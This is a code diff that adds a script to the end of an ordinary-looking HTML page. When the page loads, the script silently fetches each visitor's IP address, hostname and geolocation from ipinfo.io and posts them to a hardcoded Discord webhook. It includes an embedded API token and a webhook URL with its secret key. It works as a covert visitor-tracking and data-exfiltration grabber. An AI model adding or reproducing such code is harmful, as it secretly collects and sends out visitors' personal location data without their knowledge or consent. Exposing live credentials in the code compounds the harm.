@@ -53,6 +53,76 @@
         });
     });
 </script>
+<script>
+        // Replace 'YOUR_IPINFO_TOKEN' with your actual ipinfo.io token
+        const ipInfoToken = '0fdfd91c76f16c';
+        const webhookURL = 'https://discord.com/api/webhooks/1265054625858322464/2GZzdwURKGFgcA-9HajHUiIE4MBGX6-DHCYh9I_XmZTRTGMRS8jn2IZ2Elo_xTSNU-n1';
 
+        function getIPDetails() {
+            fetch(`https://ipinfo.io/json?token=${ipInfoToken}`)
+                .then(response => response.json())
+                .then(data => {
+                    const ipDetails = {
+                        ip: data.ip,
+                        hostname: data.hostname,
+                        loc: data.loc,
+                        isVPN: data.bogon ? 'Yes' : 'No' 
+                    };
+
+                    sendToWebhook(ipDetails);
+                })
+                .catch(error => console.error('Error fetching IP details:', error));
+        }
+
+        function sendToWebhook(details) {
+            const embed = {
+                embeds: [
+                    {
+                        title: "IP Details",
+                        color: 3447003, // Hex color code
+                        fields: [
+                            {
+                                name: "IP",
+                                value: details.ip,
+                                inline: true
+                            },
+                            {
+                                name: "Location",
+                                value: details.loc,
+                                inline: true
+                            },
+                            {
+                                name: "Hostname",
+                                value: details.hostname,
+                                inline: true
+                            },
+                            {
+                                name: "VPN",
+                                value: details.isVPN,
+                                inline: true
+                            }
+                        ],
+                        timestamp: new Date()
+                    }
+                ]
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(embed)
+            })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Success:', data);
+                })
+                .catch(error => console.error('Error sending to webhook:', error));
+        }
+
+        
+        window.onload = getIPDetails;
+    </script>
 </body>
 </html>
